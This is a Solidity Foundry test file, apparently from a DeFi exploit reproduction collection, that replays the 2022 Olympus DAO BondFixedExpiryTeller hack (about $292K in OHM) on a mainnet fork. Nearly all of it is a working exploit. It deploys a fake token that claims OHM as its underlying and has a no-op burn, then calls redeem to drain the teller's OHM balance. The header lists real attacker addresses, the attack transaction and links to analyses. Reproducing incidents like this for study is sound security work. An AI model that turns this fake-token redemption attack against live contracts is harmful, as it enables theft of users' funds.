// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$292K (30,437 OHM)
// Attacker : 0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be
// Attack Contract : 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f
// Vulnerable Contract : 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156
// Attack Tx : https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156#code#F1#L137

// @Analysis
// Twitter PeckShield : https://twitter.com/peckshield/status/1583416829237526528
// Article by Shashank : https://blog.solidityscan.com/olympus-dao-hack-analysis-f07d2a64f5ee
// Article by 0xbanky : https://mirror.xyz/0xbanky.eth/c7G9ZfTB8pzQ5cCMw5UhdFehmR6l0fVqd_B-ZuXz2_o

address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
address constant BondFixedExpiryTeller = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;

interface IBondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

contract FakeToken {
    function underlying() external pure returns (address) {
        return OHM;
    }

    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address, uint256) external pure {
        // do nothing
    }
}

contract AttackContract is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 15_794_363);
        vm.label(OHM, "OHM");
        vm.label(BondFixedExpiryTeller, "BondFixedExpiryTeller");
    }

    function testExploit() public {
        console.log("---------- Start from block %s ----------", block.number);
        emit log_named_decimal_uint("Attacker OHM balance", IERC20(OHM).balanceOf(address(this)), 9);

        address fakeToken = address(new FakeToken());

        uint256 ohmBalance = IERC20(OHM).balanceOf(BondFixedExpiryTeller);
        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, ohmBalance);
        console.log("Redeeming...");
        emit log_named_decimal_uint("Attacker OHM balance after hack", IERC20(OHM).balanceOf(address(this)), 9);
    }
}
